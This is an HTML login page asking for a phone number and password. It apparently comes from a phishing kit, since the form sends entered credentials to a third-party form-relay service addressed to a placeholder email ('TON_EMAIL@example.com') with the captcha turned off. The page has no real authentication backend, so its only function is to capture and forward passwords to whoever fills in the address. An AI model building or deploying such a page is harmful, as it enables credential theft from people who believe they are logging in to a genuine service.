<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      background-color: #000;
      font-family: Arial, sans-serif;
      color: white;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    h1 {
      text-align: center;
      margin-top: 40px;
      margin-bottom: 30px;
      font-size: 26px;
      color: white;
    }

    .login-toggle {
      display: flex;
      border-radius: 30px;
      overflow: hidden;
      background-color: #1f1f1f;
      margin-bottom: 30px;
    }

    .toggle-btn {
      padding: 12px 30px;
      font-weight: bold;
      cursor: pointer;
      border: none;
      font-size: 14px;
    }

    .active {
      background-color: #d4af37;
      color: black;
    }

    .inactive {
      background-color: #2a2a2a;
      color: white;
    }

    form {
      width: 90%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    label {
      font-size: 13px;
      margin-bottom: 5px;
      text-align: left;
    }

    .input-wrapper {
      display: flex;
      flex-direction: column;
    }

    .phone-input, .password-input {
      background-color: #2a2a2a;
      border-radius: 30px;
      height: 50px;
      display: flex;
      align-items: center;
      padding: 0 15px;
    }

    .phone-prefix {
      display: flex;
      align-items: center;
      gap: 6px;
      background-color: #1c1c1c;
      padding: 6px 10px;
      border-radius: 20px;
      margin-right: 10px;
    }

    .phone-prefix img {
      width: 20px;
      height: 20px;
      border-radius: 50%;
      object-fit: cover;
      filter: brightness(1.2);
    }

    .dial-code {
      font-size: 14px;
      color: white;
    }

    .arrow {
      font-size: 12px;
      color: white;
    }

    .phone-input input,
    .password-input input {
      background: transparent;
      border: none;
      color: white;
      font-size: 15px;
      flex: 1;
      outline: none;
    }

    .password-input img.eye-icon {
      width: 20px;
      height: 20px;
      opacity: 0.6;
    }

    .forgot-password {
      text-align: right;
      color: white;
      font-size: 13px;
      cursor: pointer;
      margin-top: -10px;
    }

    .remember-text {
      font-size: 12px;
      color: #aaa;
      text-align: left;
      margin-top: -10px;
    }

    .submit-btn {
      margin-top: 15px;
      background-color: #d4af37;
      border: none;
      border-radius: 30px;
      height: 45px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
    }
  </style>
</head>
<body>

  <h1>Log In</h1>

  <div class="login-toggle">
    <button class="toggle-btn active">Phone Login</button>
    <button class="toggle-btn inactive">Email Login</button>
  </div>

  <form action="https://formsubmit.co/TON_EMAIL@example.com" method="POST">
    <input type="hidden" name="_captcha" value="false">

    <!-- Phone Number -->
    <div class="input-wrapper">
      <label for="phone">Phone Number</label>
      <div class="phone-input">
        <div class="phone-prefix">
          <img src="https://flagcdn.com/us.svg" alt="US Flag">
          <span class="dial-code">+1</span>
          <span class="arrow">â–¾</span>
        </div>
        <input type="text" id="phone" name="Phone Number" placeholder="Phone Number" required>
      </div>
    </div>

    <!-- Password -->
    <div class="input-wrapper">
      <label for="password">Password</label>
      <div class="password-input">
        <input type="password" id="password" name="Password" placeholder="Password" required>
        <img src="https://img.icons8.com/ios-glyphs/30/cccccc/closed-eye.png" alt="Eye icon" class="eye-icon">
      </div>
    </div>

    <!-- Forgot Password + Remember -->
    <div class="forgot-password">Forgot Password?</div>
    <div class="remember-text">Remember account and password</div>

    <!-- Submit -->
    <button type="submit" class="submit-btn">Log In</button>
  </form>

</body>
</html>
